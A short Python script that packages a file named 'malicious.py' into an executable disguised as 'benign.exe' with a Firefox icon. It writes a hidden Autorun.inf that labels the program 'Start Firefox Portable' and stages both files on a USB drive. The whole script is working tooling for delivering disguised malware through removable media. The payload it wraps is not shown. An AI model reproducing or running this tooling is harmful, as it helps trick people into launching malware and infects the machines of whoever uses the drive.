import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd, "USB")

if os.path.isfile(exename):
    os.remove(exename)

print("Creating EXE")

# create executable from Python script
PyInstaller.__main__.run(
    [
        "malicious.py",
        "--onefile",
        "--clean",
        "--log-level=ERROR",
        "--name=" + exename,
        "--icon=" + icon,
    ]
)

print("EXE Created")

# clean up steps
shutil.move(os.path.join(pwd, "dist", exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename + ".spec")

with open("Autorun.inf", "w") as file:
    file.write(
        f"(Autorun)\nOpen={exename}\nAction=Start Firefox Portable\nLabel=My USB\nIcon={exename}\n"
    )

print("Setting up USB")


shutil.move(exename, usbdir)
shutil.move("Autorun.inf", usbdir)

os.system(f"attrib +h {os.path.join(usbdir, 'Autorun.inf')}")
